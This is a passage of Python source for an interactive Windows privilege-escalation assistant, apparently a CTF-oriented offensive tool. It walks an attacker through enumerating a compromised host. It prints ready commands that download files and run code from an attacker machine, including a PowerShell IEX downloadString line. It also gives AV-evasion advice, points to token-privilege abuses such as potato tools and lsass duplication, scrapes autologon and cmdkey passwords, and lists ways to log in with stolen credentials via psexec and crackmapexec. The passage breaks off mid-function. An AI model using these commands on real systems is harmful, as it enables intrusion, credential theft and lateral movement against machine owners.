#!/usr/bin/python3
'''
Winscalator: A Windows Privilege Escalation Assistant.

Author: R. Trigo aka Dr.Enfermo (@Dr_Enfermo)
Website: https://github.com/DrEnfermo/Winscalator.git

DESCRIPTION: This is an assistant for suggesting different ways to gain privileges
             in a compromised Windows target. It assumes there is an unprivileged
             user and we want to get more...

DISCLAIMER:  This tool is only for study and it's a "beta" release.
             Use the suggested commands and techniques
             under your own responsability and risk and always use this assistant with
             the authorization of target machine's owners.
             Anyway, by the moment this tool is not for "real world scenaries", but
             it could be used in CTFs and so...

TODO: Add previous checks to suggest obfuscation tactics and other tools / attacks,
      when target machine has a full AV / AMSI controls and other restrictions.
      Add also more branches to the decission tree.

'''
import re
import os
import shutil
import sys
import signal
import csv
import formatting
from time import sleep
from datetime import date, datetime, timedelta
from dateutil.parser import parse
from wsparser import WSParser
from sysinfo import SystemInfo
from userinfo import UserInfo, UserGroup, UserPriv
from banner import Banner

os.chdir(os.path.dirname(__file__))
CURR_PATH = os.getcwd()

#UNSUPPORTED VERSIONS...
#TODO: Change this :'-(...
WINXP = 'XP'
WINVISTA = 'VISTA'
WIN7 = 'WINDOWS 7'
WIN8 = 'WINDOWS 8'
WIN2000 = 'WINDOWS 2000'
WIN2003 = 'WINDOWS 2003'
WIN2008 = 'WINDOWS 2008'

working_dir = os.path.join(CURR_PATH, 'Default')
same_as_target = False
sysinfo_data = None
userinfo_data = None
wsparser = WSParser('config.ini')
file_enc = wsparser.get('formats', 'files_encoding', 'utf8')
release = wsparser.get('app', 'release')
url = wsparser.get('app', 'url')
title = wsparser.get('app', 'title')
fulltitle= '\n[*]        %s %s ( %s )   [*]' % (title, release, url)
filename = title + '.py'
hostname = ''
complete_version = ''

def populate_minimal_system_info(ver_file):
    hostname = ''
    fullversion = ''
    if os.path.exists(ver_file) and os.path.isfile(ver_file):
        with open(ver_file, newline='', encoding='cp850') as f:
            hostname = f.readline()
            fullversion = f.readline()

    return hostname.strip().replace('\r\n',''), fullversion.strip().replace('\r\n','')

def populate_system_info(sysinfo_file, type):

    sysinfo_object = None
    if os.path.exists(sysinfo_file) and os.path.isfile(sysinfo_file):
        with open(sysinfo_file, newline='', encoding=file_enc) as f:
            reader = csv.reader(f)
            for row in reader:
                if type == "wmicsysinfo":
                    # OSLanguage: row[12] -- 4 digits. last 2 digits determine the language:
                    # https://www.autoitscript.com/autoit3/docs/appendix/OSLangCodes.htm
                    # (by default, if no other results, it will be english)
                    cmdlang = 'en'
                    last2oslang =str(hex(int(str(row[12]).strip())))[-2:]
                    #print(last2oslang)

                    #TODO CHECK: wmic field named 'Locale' is already in hex and it coul be more useful...
                    if last2oslang == '07':
                        #German
                        cmdlang = 'ge'
                    if last2oslang== '09':
                        #English
                        cmdlang = 'en'
                    if last2oslang == '0a':
                        #Spanish
                        cmdlang = 'es'
                    if last2oslang == '0b':
                        #Finnish
                        cmdlang = 'fi'
                    if last2oslang == '0c':
                        #French
                        cmdlang = 'fr'
                    if last2oslang == '10':
                        #Italian
                        cmdlang = 'it'
                    if last2oslang == '13':
                        #Dutch
                        cmdlang = 'du'
                    if last2oslang == '14':
                        #Norwegian
                        cmdlang = 'no'
                    if last2oslang == '15':
                        #Polish
                        cmdlang = 'po'
                    if last2oslang == '16':
                        #Portuguese
                        cmdlang = 'pt'
                    if last2oslang == '1d':
                        #Sweddish
                        cmdlang = 'sw'

                    version = str(row[18]).strip()

                    if len(str(row[7]).strip()) > 0:
                        version += ' ' + str(row[7]).strip()
                    else:
                        version += ' N/D'

                    if len(str(row[2])) > 0:
                        version += wsparser.get('locale_%s' % cmdlang, 'build') + ' %s' % str(row[2])

                    # print(cmdlang)
                    # populated from wmic output file
                    # TODO: CHECK IF IT CAN BE COMPLETED ...
                    # TODO: CHECK DATES (THEY HAVE BEEN TREATED AS STRINGS INDEPEDENTLY FROM UTC, TIMEZONE, ETC.)
                    sysinfo_object = SystemInfo(str(row[0]).strip(), str(row[4].strip()), version,
                                                str(row[11]).strip(),'',
                                                str(row[3]).strip(), str(row[13]).strip(),
                                                '', str(row[14]).strip(),
                                                str(row[9]).strip(),
                                                str(row[10]).strip(),
                                                '', '',
                                                '', '',
                                                '', str(row[19]).strip(),
                                                str(row[16]).strip(), str(row[15]).strip(),
                                                cmdlang,
                                                '', '',
                                                '', '',
                                                '', '',
                                                '', '',
                                                '', '',
                                                '', '',
                                                '')
                else:
                    # populated from sysinfo output file
                    sysinfo_object = SystemInfo(row[0], row[1], row[2], row[3], row[4],
                                                row[5], row[6], row[7], row[8], row[9],
                                                row[10], row[11], row[12], row[13], row[14],
                                                row[15], row[16], row[17], row[18], row[19],
                                                row[20], row[21], row[22],row[23], row[24],
                                                row[25], row[26], row[27], row[28], row[29],
                                                row[30], row[31], row[32])
                    break

    return sysinfo_object


def calculate_last_3m_updates(output_file):
    is_a_date = False
    if os.path.exists(output_file) and os.path.isfile(output_file):
        with open(output_file, newline='', encoding=file_enc) as f:
            reader = csv.reader(f)
            is_a_date = False
            for row in reader:
                try:
                    #TODO CHECK: 'IT'S A FOOL VALIDATION (NON DEPENDANT ON UTC, ETC..)
                    sysinfo_data.lastUpdateInThreeMonths  = parse(row[0])
                    is_a_date = True
                    break
                except:
                    sysinfo_data.lastUpdateInThreeMonths  = ''
                    is_a_date = False
                    continue

        if is_a_date:
            print(formatting.yellow_b(
               '[+] The compromised target HAS BEEN UPDATED in the last three months. Date: ' +
                formatting.white_b(' %s ' % sysinfo_data.lastUpdateInThreeMonths)))
        else:
            print(formatting.red_b(
                '[!] The compromised target HAS NOT BEEN UPDATED IN THE LAST THREE MONTHS.\n' +
                '    It could be vulnerable to the last attacks for Privilege Escalation.\n' +
                '    Try to download and execute a WINDOWS EXPLOITS SUGGESTER TOOL like WES-NG from: \n'))
            print(formatting.cyan(' %s' % str(wsparser.get('tools', 'wesng')[0:128])))

def print_integrity_level(level, high):
    if level == high:
        print(formatting.red_b('[!] Your user\s process integrity level is: %s ' % level.upper()))
        print(formatting.red_b('    You should have SYSTEM privileges NOW for this context!'))
    else:
        print (formatting.yellow_b("[+] Your user\s process integrity level is: %s" % level.upper()))

def calculate_user_mandatory_level(cmdlang):
    mandatorylevel = wsparser.get('locale_%s' % cmdlang,'mandatory_level')
    # print(mandatorylevel)
    pattern1_to_substract = mandatorylevel.lower()[0:mandatorylevel.index('<')-1]
    # print(pattern1_to_substract)
    pattern2_to_substract = mandatorylevel.lower()[mandatorylevel.index('>')+1:]
    # print(pattern2_to_substract)
    for group in userinfo_data.groups:
        if pattern1_to_substract in str(group.name).lower():

            if len(pattern1_to_substract) > 0:
                level = str(group.name).lower().replace(pattern1_to_substract, '')
            else:
                level = str(group.name).lower().strip()

            if len(pattern2_to_substract) > 0:
                level = level.replace(pattern2_to_substract, '').strip()
            else:
                level = level.strip()

            # populate userinfo_data object with this info (integrity level pro user's running process)
            userinfo_data.proc_integrity_level = level

            print_integrity_level(level.upper(), str(wsparser.get('locale_%s' % cmdlang,'mlhigh')).upper())

            break

def calculate_user_in_admin_group(cmdlang):
    for group in userinfo_data.groups:
        local_admin_group = wsparser.get('locale_%s' % cmdlang,'local_admin_group')
        ADadmin_group = wsparser.get('locale_%s' % cmdlang,'domain_admin_group')
        admin_group = wsparser.get('locale_%s' % cmdlang,'admin_group')
        # print(admin_group)
        if local_admin_group.lower() in str(group.name).lower() :
            print(formatting.red_b('[!] Your user %s belongs to the local Administrators group (%s)!' % (userinfo_data.name, group.name)))
            userinfo_data.is_admin = True
            break

        if ADadmin_group.lower() in str(group.name).lower() :
            print(formatting.red_b('[!] Your user %s belongs to the Domain Admins group (%s)!' % (userinfo_data.name, group.name)))
            userinfo_data.is_admin = True
            break

        if admin_group.lower() in str(group.name).lower() :
            print(formatting.red_b('[!] Your user %s belongs to the Admins group (%s)!' % (userinfo_data.name, group.name)))
            userinfo_data.is_admin = True
            break

def populate_UAC_info(uac_file):
    sysinfo_data.enabledUAC = False

    if os.path.exists(uac_file) and os.path.isfile(uac_file):
        with open(uac_file, newline='', encoding='cp850') as f:
                lines = f.readlines()
                #print(len(lines))
                for i in range(0, len(lines)):
                    row = lines[i]
                    if len(row) > 1 :
                        # EnableLUA must have a value (disabled: 0, active: 1, unexistent: None)
                        if "enablelua" in row.lower():
                            sysinfo_data.enabledUAC = None
                            for i in range(2):
                                if "0x"+str(i) in row:
                                    sysinfo_data.enabledUAC = bool(i)
                                    break
                        # ConsentPromptBehaviorAdmin must have a value --> LEVEL: 0 (UAC disabled)
                        # - LEVEL 5 (default value in Windows 7 and above - elevation prompt unless:
                        #   1) Binary file is signed by Microsoft.
                        #   2) AutoElevete = True and requestExecutionLevel <> "AsInvoker" in binary manifest file.
                        #   (IT COULD LEAD TO A POTENTIAL UAC BYPASS IF USER IS AN ADMIN)
                        # UNEXISTENT IN WINXP AND IN WINDOWS VISTA, THE OPTION BY DEFAULT IS THE MOST RESTRICTED.

                        if "consentpromptbehavioradmin" in row.lower():
                            sysinfo_data.UAClevel = None
                            for i in range(6):
                                if "0x" + str(i) in row:
                                    sysinfo_data.UAClevel = i
                                    break


def populate_user_info(userinfo_file):
    if os.path.exists(userinfo_file) and os.path.isfile(userinfo_file):
        with open(userinfo_file, newline='', encoding=file_enc) as f:
            reader = csv.reader(f)
            for row in reader:
                userinfo_object = UserInfo(row[0], row[1])
                break

    return userinfo_object

def processing_AlwaysInstallElevated_config(aie_file):
    isEnabled = False
    if os.path.exists(aie_file) and os.path.isfile(aie_file):
        with open(aie_file, newline='', encoding='cp850') as f:
                lines = f.readlines()
                #print(len(lines))
                for i in range(0, len(lines)):
                    row = lines[i]
                    if len(row) > 1 :
                        if row.strip().endswith('0x1'):
                            return True
    return isEnabled

def print_ways_to_distribute_files():

    print(formatting.red_b('    ' + '-'*100))
    print(formatting.red_b('  * ') + formatting.green('THERE ARE SOME WAYS TO PLACE YOUR FILES IN THE REMOTE SYSTEM.'))
    print(formatting.green('    IF THE COMPROMISED MACHINE HAS AN UPDATED AV AND HIPS/HIDS DEVICES, OR FEATURES LIKE AMSI, ETC.'))
    print(formatting.green('    WE SHOULD USE TECHNIQUES LIKE OBFUSCATION/REMOVE THE FIRM IN OUR TOOLS, TRY TO AVOID "TOUCHING DISK", ETC.'))
    print(formatting.green('           - WAY 1: USE CERTUTILS, FROM THE OWN TARGET OS:(Not installed in Windows XP Home Ed. versions)'))
    print(formatting.cyan_b(f'                    certutil -urlcache -split -f http(s)://<attack_machine>:<port>/<file_to_download> <dest_filename>'))
    print(formatting.green('                   With -urlcache to download from url in cache, -f to force overwrite,'))
    print(formatting.green('                   and -split to use ASN.1 when downloading files.'))
    print(formatting.green('\n          - WAY 2: USE POWERSHELL, FROM THE OWN TARGET OS (installed by default in Windows 7'))
    print(formatting.green('                   Windows Servr 2008, and later versions): '))
    print(formatting.cyan_b('                    powershell "(new-object System.Net.WebClient).Downloadfile') +
          formatting.cyan_b('\'http://<attacker_machine>:<port>/<file_to_download>\',\'<new_name_of_file>\')"'))
    print(formatting.cyan_b('                    powershell "IEX(New-Object Net.WebClient).downloadString(') +
          formatting.cyan_b('\'http://<attacker_machine>:port/<file_to_download>\')"'))
    print(formatting.cyan_b('                    powershell -c (New-Object Net.WebClient).DownloadFile') +
          formatting.cyan_b('\'http://<attack_machine>:<port>/<file_to_download>\', \'<dest_filename>\')'))
    print(formatting.green('\n          - WAY 3: ACCESS VIA SMB (SHARING FOLDER IN THE ATTACKER MACHINE): '))
    print(formatting.cyan_b('                     python3 <path_to_impacket_tool>/smbserver.py <folder_to_share> .'))
    print(formatting.green('                    In the same folder where you are placed your files to exchange with target.'))
    print(formatting.green('                    And then, in the target:'))
    print(formatting.cyan_b(f'                    copy \\<attacker_machine>\<folder_to_share>\<filename> <dest_path>\<dest_filename>'))
    print(formatting.green('\n          - WAY 4: ACCESS VIA FTP/FTPS (FTP/FTPS SERVICE RUNNING IN THE ATTACKER MACHINE): '))
    print(formatting.cyan_b('                   python3 -m pyftpdlib -p 21 --write'))
    print(formatting.green('                   Then, connect via ftp from the target mahcine to the attacker\'s one '))
    print(formatting.green('                   and use get/put to donwload/upload info. Use BINARY to avoid corruption in file downloads.'))
    print(formatting.green('\n          - WAY 5: ACCESS VIA HTTP/HTTPS (HTTP/HTTPS SERVICE RUNNING IN THE ATTACKER MACHINE,'))
    print(formatting.green('                   AND DOWNLOAD DIRECTLY FROM BROWSER, OR WAYS 1 OR 2): '))
    print(formatting.cyan_b('                    python -m SimpleHTTPServer <port> '))
    print(formatting.cyan_b('                    python3 -m http.server <port> '))
    print(formatting.green('                 Or launching the http service in attacker\'s machine:'))
    print(formatting.cyan_b('                    service apache2 stop/start'))
    print(formatting.cyan_b('                    service stop/start httpd'))
    print(formatting.green('                    (the code will be placed at our /var/www/html/ folder by default) '))
    print(formatting.red_b('    ' + '-'*100))
    print(formatting.red_b(f'    YOU MUST DOWNLOAD THE FILES TO A WRITABLE FOLDER, LIKE %TEMP%\, %TMP%\, %APPDATA%\, '))
    print(formatting.red_b(f'    %USERPROFILE%\ OR %PUBLIC%\ DIRS, SO AS EXECUTE THEM IN MEMORY, WHENEVER WE CAN!'))
    print(formatting.red_b('    (IF YOU ARE RUNNING THIS ASSISTANT IN THE TARGET, YOU CAN USE THE SAME PROJECT FOLDER'))
    print(formatting.red_b('     YOU ARE USING TO OUTPUT YOUR COMMANDS)'))
    print(formatting.green_b('    ' + '-'*100))


def def_handler(sig, frame):
    """Handler for sig INT exceptions,
    to exit properly from the current program's execution

    Args:
        sig ([type]): [description]
        frame ([type]): [description]
    """
    print(formatting.red_b('\n\n[!] Program Exiting...'))
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


def clear_screen():
    sleep(1)
    # MacOS /Linux (os.name is 'posix')
    if os.name == 'posix':
        _ = os.system('clear')
    else:
        # Windows
        _ = os.system('cls')

def exit_program():
    print()
    input(formatting.yellow('[*] Please, press') + formatting.green_b(' [ENTER]') + formatting.yellow(' to exit this assistant ...'))
    print()
    print(formatting.yellow('[-] Program Exiting...'))
    clear_screen()
    sys.exit(0)

def enter_to_continue():
    print()
    input(formatting.yellow('[*] Please, press') + formatting.green_b(' [ENTER]') + formatting.yellow(' to continue ...'))
    print()

def yesno(question):
    """Recursive function that receives a string with
    the question. If first character introduced by user is y/Y or n/N, it will
    execute again. If not, it will return the boolean equivalent to y/n...

    Args:
        question ([string]): [question made by the program with an answer y/n]

    Returns:
        [bool]: [True if y/Y | False if n/N]
    """
    prompt = f'{question} (y/n): '
    answer = input(prompt).strip().lower()[0:1]
    if answer not in ['y', 'n']:
        print(formatting.red_b('\n[!] Answer is invalid. Please, try again...'))
        return yesno(question)
    if answer == 'y':
        return True
    return False


def get_valid_filename(name):
    """
    NOTE: Function slightly adapted from 'https://github.com/django/django/blob/main/django/utils/text.py'
    Return the given string converted to a string that can be used for a clean
    filename. Remove leading and trailing spaces; convert other spaces to
    underscores; and remove anything that is not an alphanumeric, dash,
    underscore, or dot.
    >>> get_valid_filename("john's portrait in 2004.jpg")
    'johns_portrait_in_2004.jpg'
    """
    s = str(name).strip().replace(' ', '_')
    s = re.sub(r'(?u)[^-\w.]', '', s)
    if s in {'', '.', '..'}:
        raise shutil.error("Could not derive file name from '%s'" % name)
    return s


def recreate_directory(directory):
    """Returns true if file exists ...
    Args:
        filename ([string]): [filename with its absolute path]

    Returns:
        [bool]: [True if file exits | False if not]
    """
    if os.path.exists(directory) and os.path.isdir(directory):
        if yesno(formatting.red_b('[!] Directory') +
                 formatting.cyan_b(' %s ' % directory) +
                 formatting.red_b(' already exists!') +
                 formatting.yellow('\n    [+] Do you want to continue?')):

            if yesno(formatting.red_b('\n   [!] Do you want to delete the file contents for the existing project?') +
                     formatting.yellow('\n            [*] If you answer \'y|Y\', ALL THE CONTENTS FOR THAT DIRECTORY WILL BE DELETED!') +
                     formatting.yellow('\n            [*] Answer \'n|N\' for continuing with the existing files in the project-')):
                shutil.rmtree(directory)

            os.makedirs(directory, exist_ok=True)
            return True
        else:
            return False
    else:
        os.makedirs(directory)
        return True


def delete_file(filename):
    """Delete the file passed as argument ...

    Args:
        filename ([string]): [filename with its absolute path]

    Returns:
        [bool]: [True if file exits and user wants to delete it or it does not exist (successful operation)
              |  False if user do not want to delete it]
    """
    if os.path.exists(filename) and os.path.isfile(filename):
        if not yesno(formatting.red_b('[!] File %s already exists. Do you want to overwrite it?' % filename)):
            return False
        else:
            os.remove(filename)

    return True


def create_project_folder(working_dir):
    """ Given the name of the project by user,
        a folder will be created under the application path.

    Args:
        working_dir ([string]): [folder with the keyname of the project without spaces]
    """
    try:
        print()
        print(formatting.yellow(
            '[-] Creating working directory: %s\n' % working_dir))

        if not recreate_directory(working_dir):
            print(formatting.red_b(
                '\n[!] Exiting Program by user\'s decision (User chose \'n\')...\n'))
            sys.exit(0)

        print(formatting.yellow("\n[+] Directory '% s' created.\n" % working_dir))
    except OSError as error:
        print(formatting.red_b('[!] ERROR: %s' % error))

def print_cmdkey_credentials(outputfile, cmdlang):
    found = False
    if os.path.exists(outputfile) and os.path.isfile(outputfile):
        with open(outputfile, newline='', encoding='cp850') as f:
            lines = f.readlines()
            #print(len(lines))
            for i in range(0, len(lines)):
                row = lines[i]
                if len(row) > 1 :
                    parts = str(row).strip().split(':')
                    if str(wsparser.get('locale_%s' % cmdlang, 'password')).lower() in parts[0].lower():
                        print(formatting.red_b('\n    [!] Password Reference found!\n'))
                        print(formatting.white_b('        ' + str(row)))
                        found = True
    return found

def check_potatoes():
    potato = False

    for tokenpriv in userinfo_data.privs:
        if isinstance(tokenpriv, UserPriv):
            if "SeAssignPrimaryToken" in tokenpriv.name:
                print(formatting.red_b('    [!] SeAssignPrimaryToken would allow a user to impersonate tokens and privesc' +
                                '\n     to NT system using tools such of potato.exe, rottenpotato.exe, juicypotato.exe...'))
                print()
                potato = True
                continue

            if "SeImpersonate" in tokenpriv.name:
                print(formatting.red_b('    [!] Similarly to SeAssignPrimaryToken, SeImpersonate allows by Design to create' +
                                        '\n     a process under the security context of another user (using handle to a token of ' +
                                        '\n     said user). Multiple tools and techniques may be used to obtain the required token ' +
                                        '\n     (tools from the Potato family: potato.exe, RottenPotato, RottenPotanoNG, JuicyPotato,' +
                                        '\n     SweetPotato, RemotePotato, RogeWinRM, PrintSpoofer, etc.'))
                print()
                potato = True
                continue

            if "SeBackup" in tokenpriv.name:
                print(formatting.red_b('    [!] SeBackup could allow to backup the HKLM\SAM and HKLM\SYSTEM registry hves, and then' +
                                        '\n     extract the local accounts hashes from the SAM database and use Passs-The-Hash' +
                                        '\n     techniques as a member of Administrators group. Alternatively can be used to read' +
                                        '\n     sensitive files.'
                                        '\n     Check more info at:'))
                print(formatting.cyan_b('                     %s' % wsparser.get('tools','sebackupprivilege')))
                print()
                potato = True
                continue

            if "SeCreateToken" in tokenpriv.name:
                print(formatting.red_b('    [!] SeCreateToken could allow the creation of arbitrary token including local ' +
                                        '\n     admin rights with NtCreateToken'))

                print()
                potato = True
                continue

            if "SeDebug" in tokenpriv.name:
                print(formatting.red_b('    [!] SeDebug could allow the duplication of lsass.exe token (with Powershell)' +
                                        '\n     Check PoC at:'))
                print(formatting.cyan_b('                     %s' % wsparser.get('tools','conjurelsass')))
                print()
                potato = True
                continue

            if "SeLoadDriver" in tokenpriv.name:
                print(formatting.red_b('    [!] SeLoadDriver could allow to load a buggy kernel driver (such as szkg64.sys) ' +
                                        '\n        and then exploit the kernel vulnerability (like CVE-2018-15732), which PoC' +
                                        '\n        can be found at: '))
                print(formatting.cyan_b('                     %s' % wsparser.get('tools','szkg64PoC')))
                print()
                potato = True
                continue

            if "SeManageVolume" in tokenpriv.name:
                print(formatting.red_b('    [!] SeManageVolume can be abused to allow privilege escalation !!'))
                potato = True

            if "SeRestore" in tokenpriv.name:
                print(formatting.red_b('    [!] SeRestore can be abused to allow privilege escalation !!'))
                print()
                potato = True
                continue

            if "SeTakeOwnership" in tokenpriv.name:
                print(formatting.red_b('    [!] SeTakeOwnership can be abused to allow privilege escalation !!'))
                print()
                potato = True
                continue

            if "SeTcb" in tokenpriv.name:
                print(formatting.red_b('    [!] SeTcb can be abused to allow privilege escalation !!'))
                print()
                potato = True

    if potato == True:
        print(formatting.red_b('    [*] Please, for more details about these attacks and Token Privieges Abuse, go to: '))
        print(formatting.cyan_b('        %s' % wsparser.get('tools','moreabouttokens')))

    return potato

def print_autologon_credentials(outputfile):
    defdomainname = ''
    defusername = ''
    defpassword = ''
    found = False
    if os.path.exists(outputfile) and os.path.isfile(outputfile):
        with open(outputfile, newline='', encoding='cp850') as f:
            lines = f.readlines()
            #print(len(lines))
            for i in range(0, len(lines)):
                row = lines[i]
                if len(row) > 1 :
                    parts = str(row).strip().split(' ')
                    if 'defaultdomainname' in row.lower():
                        defdomainname = str(parts[-1:])
                        print('DefaultDomainName: %s' % defdomainname)
                        continue
                    if 'defaultusername' in row.lower():
                        defusername = str(parts[-1:])
                        print('DefaultUserName: %s' % defusername)
                        continue
                    if 'defaultPassword' in row.lower():
                        defpassword = str(parts[-1:])
                        print('DefaultPassword: %s' % defpassword)
                        found=True
                        continue
    return found, defdomainname, defusername, defpassword

def print_ways_to_connect_with_new_credentials():
    print()
    print(formatting.red_b('      WE COULD TRY SOME WAYS TO CONNECT WITH THE RETRIEVED USER AND PASSWORD:'))
    print(formatting.red_b('\n      WAY 1: winexe tool :') + formatting.cyan_b('winexe -U \'<user>@<password>\' <target_machine> cmd.exe'))
    print(formatting.red_b('      WAY 2: PowerUp.ps1 script (Powerexploit tools):') + formatting.cyan_b('method Get-RegistryAutoLogon'))
    print(formatting.red_b('      WAY 3: Metasploit module :') + formatting.cyan_b('post/windows/gather/credentials/windows_autologin'))
    print(formatting.red_b('      WAY 4: Crackmapexec :') + formatting.cyan_b('crackmapexec.py smb <target_machine> -u <user> -p <password>'))
    print(formatting.red_b('      WAY 5: Impacket PsExec tool :') + formatting.cyan_b('psexec.py <DOMAIN_NAME|WORKGROUP>/<user>\<password>@<target_machine> cmd.exe'))
    print(formatting.red_b('             (if it doesn\'t work, we could use smbexec.py from Impacket or Impacket PsExec tool :') + formatting.cyan_b('psexec.py <DOMAIN_NAME|WORKGROUP>/<user>\<password>@<target_machine> cmd.exe'))
    print(formatting.red_b('\n    THESE ARE ONLY A FEW WAYS TO LAUNCH A NEW SHELL WITH THE NEW CREDENTIALS, AND A WAY TO ESCALATE...'))
    print()

def menu_cmd(step, commands, output_file, type, cmdlang=''):
    """Menu for getting user info with different commands and retrieving the
    relevant data on files to be processed later. Each command will
    populate data info and instantiate classes to work...

    Args:
        command ([string]): [command to be executed by user in remote machine]
        output_file ([string]): [file where user must dump data retrieved with command]
        type ([string]): [type of command which will determine the action to perform]
    """
    global hostname, complete_version, sysinfo_data, userinfo_data, working_dir, same_as_target

    absolute_path = os.path.join(working_dir, output_file)

    if os.path.exists(absolute_path) and os.path.isfile(absolute_path):
        if yesno(formatting.red_b('[!] The file %s already exits in the working directory.' % absolute_path) +
                     formatting.red_b(' Do you want to delete it and execute again this step?') +
                     formatting.yellow('\n   [*] If you choose \'y|Y\' the file will be deleted and you\'ll have to execute the command again.') +
                     formatting.yellow('\n   [*] If you choose \'n|N\' the assistant will continue with the next step...')):
            os.remove(absolute_path)

    destination_file = output_file
    services_file = 'services.txt'
    startup_file = 'startuppaths.txt'

    if same_as_target:
        destination_file = absolute_path
        services_file = os.path.join(working_dir, services_file)
        startup_file = os.path.join(working_dir, startup_file)

    command2exec = commands[0].replace('<services_file>', services_file).replace('<startup_file>', startup_file).replace('<output_file>', destination_file)

#   INIT COMMANDS MENU...

    while not os.path.isfile(absolute_path):
        clear_screen()
        print()
        if not same_as_target:
            print(formatting.green('[*] PLEASE, MAKE SURE HAVE WRITE ACCESS TO THE FOLDER WHERE YOU ARE GOING TO EXECUTE\n') +
                  formatting.green('    THE COMMAND BEFORE RUNNING IT, AND THEN, MOVE THE  OUTPUT FILE FOR THIS \n') +
                  formatting.green('    COMMAND TO THE (LOCAL) PROJECT\'S WORKING DIRECTORY IN:\n') +
                  formatting.cyan('    %s\n' % working_dir) +
                  formatting.green('    BEFORE CONTINUING WITH THE NEXT STEP...'))

        print()
        print(formatting.green('_'*79 + '\n'))
        print(formatting.green('[+ STEP %i] - %s ' % (step,  str(wsparser.get('privesc_enum',type))[0:128])))
        print(formatting.green('_'*79 + '\n'))
        print(formatting.yellow(
            '[*] Please, type (copy/paste) in the target\'s remote console the following command:\n'))

        print(formatting.cyan_b('          %s\n' % command2exec ))

        print(formatting.yellow('    HELP: Saves the output of the above command executed\n') +
              formatting.yellow('          in the compromised machine, to the file: \n') +
              formatting.cyan_b('\n          %s ' % destination_file))

        print(formatting.green('\n[*] NOTE: IF YOU\'RE USING A METERPRETER SESSION, CHANGE TO shell MODE\n' +
                               '          AND EXECUTE DOS COMMAND INSTEAD OF METERPRETER EQUIVALENT.\n'))
        if len(commands) > 1:
            print(formatting.green('[*] NOTE 2: IF THIS COMMAND DOESN\'T WORK OR YOU DO NOT HAVE ENOUGH PERMISSIONS, TRY WITH:\n'))
            for command in commands[1:]:
                command2exec = command.replace('<services_file>', services_file).replace('<startup_file>', startup_file).replace('<output_file>', destination_file)
                print(formatting.red('    [*]') +
                       formatting.cyan_b(' %s \n' % command2exec), end='')

                if "accesschk" in command:
                      print(formatting.green('        [*] To use \'accesschk\', first download and unzip'))
                      print(formatting.green('            the application to the remote target machine from:'))
                      print(formatting.cyan('            %s' % str(wsparser.get('tools', 'accesschk')[0:128])))
                      print(formatting.green('            Use accesschk64.exe instead of accesschk.exe, for 64 bits platforms.'))
        print()
        answer = input(formatting.yellow('[*] Please, make sure the file\n') +
                       formatting.green_b('    %s\n' % destination_file) +
                       formatting.yellow('    is in the (local) working directory for this assistant and press') +
                       formatting.green(' [ENTER]\n') + formatting.yellow('    to continue...\n' +
                       formatting.green('_'*79 + '\n')))

        if not os.path.isfile(absolute_path):
            if len(hostname) != 0  and len(complete_version) != 0 and type == "sysinfo":
                if yesno(formatting.red_b('[!] The file %s doesn\'t exist' % absolute_path) +
                     formatting.red_b(' Do you want to continue skiping this step and filling system info with the minimal data?') +
                     formatting.yellow('\n   [*] If you choose \'y|Y\' the system info step will be skipped') +
                     formatting.yellow('\n   [*] If you choose \'n|N\' the assistant will not continue till you dump ') +
                     formatting.yellow('the output for systeminfo command')):

                    syslocale = ''
                    # print('['+ wsparser.get('locale_es','version').lower())
                    # print('['+ wsparser.get('locale_en-us','version').lower())
                    # print(complete_version.lower())
                    #TODO: Extract to a function and extend the use of other languages...
                    if '['+ wsparser.get('locale_es','version').lower() in complete_version.lower():
                        syslocale = 'es;'

                    if '['+ wsparser.get('locale_en-us','version').lower() in complete_version.lower():
                        syslocale = 'en-us;'

                    # print(syslocale)
                    osName = complete_version[0:complete_version.index('[')].strip()

                    osVersion = complete_version[complete_version.index('[')+1:complete_version.index(']')].replace(str(wsparser.get('locale_%s' % syslocale,'version')), '').strip()

                    if "10.0." in osVersion and "Windows 10" not in osName:
                        osName += " 10"

                    # print(osVersion)
                    # print(osName)

                    sysinfo_data = SystemInfo(hostname, osName, osVersion, 'Microsoft Corporation','','','','','','','',
                                               '','','','','','C:\Windows','C:\Windows\System32','',syslocale,'','','','','','','','','','',[],[],'')
                    print(formatting.white_b(sysinfo_data.asdict()))
                    break

                else:
                    print(formatting.red_b('[!] File ') + formatting.yellow(' %s' % output_file) +
                            formatting.red_b(' is not present in') + formatting.yellow_b(' %s' % working_dir))
            else:
                print(formatting.red_b('[!] File ') + formatting.yellow(' %s' % output_file) +
                      formatting.red_b(' is not present in') + formatting.yellow_b(' %s' % working_dir))

# End COMMANDS MENU

# PROCESSING OPTIONS AND STORING DATA IN CLASSES, AND PROCESS WAYS TO ESCALATE...
    clear_screen()
    if type == "ver":
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to the target system hostname and version...'))
        hostname, complete_version = populate_minimal_system_info(absolute_path)
        print(formatting.white_b({'hostname': hostname, 'complete_version': complete_version}))
        print(formatting.yellow(
            '[+] hostame and OS Version have been stored...'))
        print()
        enter_to_continue()
    if type == "wmicsysinfo"and not isinstance(sysinfo_data, SystemInfo):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to the target system...'))
        sysinfo_data = populate_system_info(absolute_path, type)
        print(formatting.white_b(sysinfo_data.asdict()))
        print(formatting.yellow(
            '[+] System info structure has been stored...'))
        print()
        enter_to_continue()
    if type == "sysinfo" and not isinstance(sysinfo_data, SystemInfo):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to the target system...'))
        sysinfo_data = populate_system_info(absolute_path, type)
        print(formatting.white_b(sysinfo_data.asdict()))
        print(formatting.yellow(
            '[+] System info structure has been stored...'))
        print()
        enter_to_continue()
    if (type == "patchedrecently"):
        print()
        print(formatting.yellow(
            '[-] Storing the last patches date from the target system...'))
        print()
        calculate_last_3m_updates(absolute_path)
        print()
        enter_to_continue()
    if (type == "username"):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to the target user...'))
        userinfo_data = populate_user_info(absolute_path)
        userinfo_data.print_onlyUserInfo()
        print()
        print(formatting.yellow(
            '[+] All the compromised User\'s info has been stored...'))
        print()
        enter_to_continue()
    if (type == "groups"):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to user\'s groups...'))
        userinfo_data.add_groups(absolute_path)
        userinfo_data.print_groups()
        print(formatting.yellow(
            '[+] All the User\'s groups have been stored...'))
        print()
        calculate_user_mandatory_level(cmdlang)
        calculate_user_in_admin_group(cmdlang)

        if isinstance(userinfo_data.is_admin, bool) and userinfo_data.is_admin and WINXP in sysinfo_data.osName.upper():
